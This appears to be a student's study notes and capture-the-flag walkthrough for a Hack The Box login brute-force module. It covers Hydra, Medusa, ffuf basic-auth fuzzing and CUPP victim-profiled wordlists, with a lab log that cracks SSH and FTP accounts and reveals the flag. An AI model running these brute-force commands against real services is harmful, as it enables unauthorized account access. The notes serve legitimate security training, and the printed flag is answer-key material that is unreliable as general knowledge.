# Login brute force

\*\*Wordlists used in these module

```
/home/umedh/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt
/opt/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
top-usernames-shortlist.txt 
2023-200_most_used_passwords.txt
2020-200_most_used_passwords.txt
```

_Some times hydra and medusa these are the protocol blind and fail because of when ever companies are using the http auth in that time there is no username and password like names stored in the front-end and back-end if it fails it give 401 but these tools give fake success of login but it fails at that time we need to use the ffuf_

```
 ffuf -w top-usernames-shortlist.txt:USER -w 2023-200_most_used_passwords.txt:PASS \
-u http://USER:PASS@154.57.164.75:30167/ \
-fc 401 -fr '401 Authorization Required'
```

## Hydra

```
Umedh@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
```

**The flags that are used in the hydra**

| Parameter               | Explanation                                                                                                | Usage Example                                                                                                                                                                 |
| ----------------------- | ---------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-l LOGIN` or `-L FILE` | Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`).    | `hydra -l admin ...` or `hydra -L usernames.txt ...`                                                                                                                          |
| `-p PASS` or `-P FILE`  | Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`). | `hydra -p password123 ...` or `hydra -P passwords.txt ...`                                                                                                                    |
| `-t TASKS`              | Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.           | `hydra -t 4 ...`                                                                                                                                                              |
| `-f`                    | Fast mode: Stop the attack after the first successful login is found.                                      | `hydra -f ...`                                                                                                                                                                |
| `-s PORT`               | Port: Specify a non-default port for the target service.                                                   | `hydra -s 2222 ...`                                                                                                                                                           |
| `-v` or `-V`            | Verbose output: Display detailed information about the attack's progress, including attempts and results.  | `hydra -v ...` or `hydra -V ...` (for even more verbosity)                                                                                                                    |
| `service://server`      | Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname.      | `hydra ssh://192.168.1.100`                                                                                                                                                   |
| -S=302                  | look for an **HTTP 302 Redirect**.                                                                         | `hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 154.57.164.77 -s 32718 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"` |
| -x 6:8:abc...           | <p>Bruteforce Generator<br>This is the "brain" of the command. It generates passwords on it's own</p>      | `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`                                                              |

| Hydra Service | Service/Protocol                 | Description                                                                                             | Example Command                                                                                                |
| ------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| ftp           | File Transfer Protocol (FTP)     | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                             |
| ssh           | Secure Shell (SSH)               | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.      | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                              |
| http-get/post | HTTP Web Services                | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.       | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp          | Simple Mail Transfer Protocol    | Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.        | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                          |
| pop3          | Post Office Protocol (POP3)      | Targets email retrieval services to brute-force credentials for POP3 login.                             | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                               |
| imap          | Internet Message Access Protocol | Used to brute-force credentials for IMAP services, which allow users to access their email remotely.    | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                               |
| mysql         | MySQL Database                   | Attempts to brute-force login credentials for MySQL databases.                                          | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`                                            |
| mssql         | Microsoft SQL Server             | Targets Microsoft SQL servers to brute-force database login credentials.                                | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                              |
| vnc           | Virtual Network Computing (VNC)  | Brute-forces VNC services, used for remote desktop access.                                              | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                      |
| rdp           | Remote Desktop Protocol (RDP)    | Targets Microsoft RDP services for remote login brute-forcing.                                          | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                             |

\*\*Targeting Multiple SSH Servers

Consider a situation where you have identified several servers that may be vulnerable to SSH brute-force attacks. You compile their IP addresses into a file named `targets.txt` and know that these servers might use the default username "root" and password "toor." To efficiently test all these servers simultaneously, use the following Hydra command:

```
Umedh@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
```

This command instructs Hydra to:

* Use the username "root".
* Use the password "toor".
* Target all IP addresses listed in the `targets.txt` file.
* Employ the `ssh` module for the attack.

```
Umedh@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

This command instructs Hydra to:

* Use the username "admin".
* Use the list of passwords from the `passwords.txt` file.
* Target the login form at `/login` on `www.example.com`.
* Employ the `http-post-form` module with the specified form parameters.
* Look for a successful login indicated by the HTTP status code `302`.

\*\*Advanced RDP Brute-Forcing

Now, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP `192.168.1.100`. You suspect the username is "administrator," and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers. To carry out this precise attack, use the following Hydra command:

```
Umedh@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

This command instructs Hydra to:

* Use the username "administrator".
* Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
* Target the RDP service on `192.168.1.100`.
* Employ the `rdp` module for the attack.

\*\*POST request format

```
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 154.57.164.77 -s 32718 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

\*The `http-post-form` module expects a single string containing three parts separated by colons: **Path**, **POST Data**, and **Condition**.

\*\*GET request format

```
 hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.79   -s 32367 -V http-get /
```

***

***

## Medusa

\*\*Command Syntax and Parameter Table

```
Umedh@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
```

| Parameter                  | Explanation                                                                                                                              | Usage Example                                                                                                                                                      |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `-h HOST` or `-H FILE`     | Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`).              | `medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...`                                                                                                        |
| `-u USERNAME` or `-U FILE` | Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`).                               | `medusa -u admin ...` or `medusa -U usernames.txt ...`                                                                                                             |
| `-p PASSWORD` or `-P FILE` | Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`).                               | `medusa -p password123 ...` or `medusa -P passwords.txt ...`                                                                                                       |
| `-M MODULE`                | Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`).                                                   | `medusa -M ssh ...`                                                                                                                                                |
| `-m "MODULE_OPTION"`       | Module options: Provide additional parameters required by the chosen module, enclosed in quotes.                                         | `medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...` |
| `-t TASKS`                 | Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.                                          | `medusa -t 4 ...`                                                                                                                                                  |
| `-f` or `-F`               | Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`).              | `medusa -f ...` or `medusa -F ...`                                                                                                                                 |
| `-n PORT`                  | Port: Specify a non-default port for the target service.                                                                                 | `medusa -n 2222 ...`                                                                                                                                               |
| `-v LEVEL`                 | Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output. | `medusa -v 4 ...`                                                                                                                                                  |

| Medusa Module    | Service/Protocol                 | Description                                                                                 | Usage Example                                                                                                               |
| ---------------- | -------------------------------- | ------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| FTP              | File Transfer Protocol           | Brute-forcing FTP login credentials, used for file transfers over a network.                | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| HTTP             | Hypertext Transfer Protocol      | Brute-forcing login forms on web applications over HTTP (GET/POST).                         | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| IMAP             | Internet Message Access Protocol | Brute-forcing IMAP logins, often used to access email servers.                              | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| MySQL            | MySQL Database                   | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`                                                                 |
| POP3             | Post Office Protocol 3           | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.            | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| RDP              | Remote Desktop Protocol          | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.       | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| SSHv2            | Secure Shell (SSH)               | Brute-forcing SSH logins, commonly used for secure remote access.                           | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`                                                                   |
| Subversion (SVN) | Version Control System           | Brute-forcing Subversion (SVN) repositories for version control.                            | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| Telnet           | Telnet Protocol                  | Brute-forcing Telnet services for remote command execution on older systems.                | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`                                                               |
| VNC              | Virtual Network Computing        | Brute-forcing VNC login credentials for remote desktop access.                              | `medusa -M vnc -h 192.168.1.100 -P passwords.txt`                                                                           |
| Web Form         | Brute-forcing Web Login Forms    | Brute-forcing login forms on websites using HTTP POST requests.                             | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`   |

```
 medusa -h 154.57.164.66 -n 32687 -u sshuser -P /home/umedh/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt  -  M  ssh -t 5

```

```
Umedh@htb[/htb]$ ftp ftp://<USER_NAME>:<PASSWORD>@localhost
```

_After finding the username and password for the ftp by using the medusa or hydra for login we do like above_

```
Umedh@htb[/htb]$ ssh <USER_NAME>@<IP> -p PORT
```

_After finding the username and password for the shh we can login like above_

```

┌──(umedh㉿kali)-[~]
└─$ medusa -h 154.57.164.66 -n 32687 -u sshuser -P /home/umedh/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt  -M  ssh -t 5
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-04-08 01:21:28 ACCOUNT CHECK: [ssh] Host: 154.57.164.66 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 12345678 (1 of 200 complete)
2026-04-08 01:21:28 ACCOUNT CHECK: [ssh] Host: 154.57.164.66 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: admin (2 of 200 complete)
2026-04-08 01:21:28 ACCOUNT CHECK: [ssh] Host: 154.57.164.66 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 123456789 (3 of 200 complete)
2026-04-08 01:21:28 ACCOUNT CHECK: [ssh] Host: 154.57.164.66 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 123456 (4 of 200 complete)
									-- SNIP --
2026-04-08 01:22:16 ACCOUNT CHECK: [ssh] Host: 154.57.164.66 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: Admin@123 (46 of 200 complete)
2026-04-08 01:22:16 ACCOUNT CHECK: [ssh] Host: 154.57.164.66 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: qwerty123 (47 of 200 complete)
2026-04-08 01:22:19 ACCOUNT CHECK: [ssh] Host: 154.57.164.66 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1q2w3e4r5t (48 of 200 complete)
2026-04-08 01:22:19 ACCOUNT FOUND: [ssh] Host: 154.57.164.66 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
2026-04-08 01:22:21 ACCOUNT CHECK: [ssh] Host: 154.57.164.66 (1 of 1, 0 complete) User: sshuser (1 of 1, 1 complete) Password: pass (49 of 200 complete)

┌──(umedh㉿kali)-[~]
└─$ ssh sshuser@154.57.164.66
ssh: connect to host 154.57.164.66 port 22: Connection refused

┌──(umedh㉿kali)-[~]
└─$ ssh sshuser@154.57.164.66:32687
ssh: Could not resolve hostname 154.57.164.66:32687: Name or service not known

┌──(umedh㉿kali)-[~]
└─$ ssh sshuser@154.57.164.66 -p 32687
The authenticity of host '[154.57.164.66]:32687 ([154.57.164.66]:32687)' can't be established.
ED25519 key fingerprint is: SHA256:2DP/wThlQCF/4IvGaF49XZcQO0bREny3YAZ1wSonr2g
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[154.57.164.66]:32687' (ED25519) to the list of known hosts.
sshuser@154.57.164.66's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.18.9-talos x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
sshuser@ng-1604992-loginbfservice-hb17p-65d8c587c8-94npq:~$ ls
2020-200_most_used_passwords.txt
sshuser@ng-1604992-loginbfservice-hb17p-65d8c587c8-94npq:~$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: 123456789 (1 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: 123456 (2 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: picture1 (3 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: password (4 of 197 complete)
								-- SNIP --
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
sshuser@ng-1604992-loginbfservice-hb17p-65d8c587c8-94npq:~$ ftp ftp://ftpuser:qqww1122@localhost
Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||23345|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Apr 07 19:48 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||65274|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |***********************************************************************************************************************************************************************************************|    35      697.54 KiB/s    00:00 ETA
226 Transfer complete.
35 bytes received in 00:00 (118.26 KiB/s)
ftp> exit
221 Goodbye.
sshuser@ng-1604992-loginbfservice-hb17p-65d8c587c8-94npq:~$ cat flag.txt
HTB{SSH_and_FTP_Bruteforce_Success}
sshuser@ng-1604992-loginbfservice-hb17p-65d8c587c8-94npq:~$
```

***

***

## Custom wordlist

\*\*CUPP

_Cupp mainly used for the custom password creator_ With the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is where `CUPP` (Common User Passwords Profiler) steps in, a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.

```

┌──(umedh㉿kali)-[~]
└─$ cupp -i
/usr/bin/cupp:146: SyntaxWarning: invalid escape sequence '\ '
  print("      \                     # User")
/usr/bin/cupp:147: SyntaxWarning: invalid escape sequence '\ '
  print("       \   \033[1;31m,__,\033[1;m             # Passwords")
/usr/bin/cupp:148: SyntaxWarning: invalid escape sequence '\ '
  print("        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m         # Profiler")
/usr/bin/cupp:149: SyntaxWarning: invalid escape sequence '\ '
  print("           \033[1;31m(__)    )\ \033[1;m  ")
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): Janey

[-] You must enter 8 digits for birthday!
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```

\*\*Username Anarchy

_It is an username creator_ Even when dealing with a seemingly simple name like "Jane Smith," manual username generation can quickly become a convoluted endeavor. While the obvious combinations like `jane`, `smith`, `janesmith`, `j.smith`, or `jane.s` may seem adequate, they barely scratch the surface of the potential username landscape.

```
Umedh@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```
